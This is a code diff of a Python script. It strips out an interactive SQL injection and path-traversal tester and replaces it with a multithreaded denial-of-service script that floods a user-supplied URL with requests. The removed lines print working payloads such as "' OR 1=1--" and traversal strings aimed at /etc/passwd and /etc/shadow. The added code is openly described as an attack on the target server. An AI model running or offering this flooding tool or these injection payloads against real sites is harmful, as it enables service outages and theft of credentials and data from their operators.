@@ -1,4 +1,6 @@
 import requests
+import threading
+import sys
 from datetime import datetime
 
 try:
@@ -9,76 +11,38 @@ except:
         def __getattr__(self, _): return ''
     Fore = Style = Dummy()
 
-def run_injection_tests():
-    url = input("Enter target URL (e.g. http://target.com/page.php?file=): ")
-    print("\nSelect Test Type:")
-    print("1. SQL Injection")
-    print("2. File Path Traversal (LFI)")
+# Function to send HTTP requests
+def send_request(url):
+    try:
+        response = requests.get(url, timeout=5)
+        if response.status_code == 200:
+            print(Fore.GREEN + f"[✓] Request sent to {url} - Status: {response.status_code}")
+        else:
+            print(Fore.YELLOW + f"[?] Request sent to {url} - Status: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(Fore.RED + f"[!] Error while sending request to {url}: {e}")
 
-    choice = input("Choice: ")
-    results = []
+# Main function to handle DoS
+def run_dos_attack():
+    url = input("Enter target URL (e.g. http://target.com/page.php?id=1): ")
+    threads = int(input("Enter number of threads (e.g. 100): "))
 
-    if choice == "1":
-        payloads = [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "' UNION SELECT null, null--",
-            "' OR EXISTS(SELECT * FROM users)--",
-        ]
-        print(f"\n[+] {Fore.YELLOW}Testing SQL Injection...\n{Style.RESET_ALL}")
-        for p in payloads:
-            test_url = url + p
-            try:
-                r = requests.get(test_url, timeout=5)
-                if "sql" in r.text.lower() or "syntax" in r.text.lower():
-                    msg = f"[!] SQLi Found with: {p}"
-                    print(Fore.RED + msg)
-                    results.append(msg)
-                elif r.status_code == 200:
-                    msg = f"[?] {p} -> 200 OK (check manually)"
-                    print(Fore.YELLOW + msg)
-                    results.append(msg)
-                else:
-                    print(f"[i] {p} -> Status {r.status_code}")
-            except Exception as e:
-                print(f"[!] Error: {e}")
+    print(f"\n[+] Starting DoS attack on {url} with {threads} threads...\n")
+    print("[!] Please note, this will flood the server with requests.")
 
-    elif choice == "2":
-        payloads = [
-            "../../../../etc/passwd",
-            "../../../../../windows/win.ini",
-            "../" * 6 + "etc/passwd",
-            "../../etc/shadow",
-        ]
-        print(f"\n[+] {Fore.YELLOW}Testing File Path Traversal (LFI)...\n{Style.RESET_ALL}")
-        for p in payloads:
-            test_url = url + p
-            try:
-                r = requests.get(test_url, timeout=5)
-                if "root:x:" in r.text or "[extensions]" in r.text:
-                    msg = f"[!] LFI Found with: {p}"
-                    print(Fore.RED + msg)
-                    results.append(msg)
-                elif r.status_code == 200:
-                    msg = f"[?] {p} -> 200 OK (check manually)"
-                    print(Fore.YELLOW + msg)
-                    results.append(msg)
-                else:
-                    print(f"[i] {p} -> Status {r.status_code}")
-            except Exception as e:
-                print(f"[!] Error: {e}")
+    # Create a list to keep track of threads
+    thread_list = []
+    for _ in range(threads):
+        thread = threading.Thread(target=send_request, args=(url,))
+        thread_list.append(thread)
+        thread.start()
 
-    else:
-        print(Fore.RED + "[!] Invalid selection.")
-        return
+    # Wait for all threads to finish
+    for thread in thread_list:
+        thread.join()
 
-    if results:
-        filename = f"injection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        with open(filename, "w") as f:
-            f.write("Injection Test Report\n")
-            f.write("======================\n")
-            f.write(f"Target: {url}\n")
-            f.write(f"Type: {'SQLi' if choice == '1' else 'LFI'}\n\n")
-            for line in results:
-                f.write(line + "\n")
-        print(Fore.GREEN + f"\n[✓] Report saved to {filename}")
+    print(Fore.RED + "\n[!] Attack finished.")
+
+# Start the attack
+if __name__ == "__main__":
+    run_dos_attack()
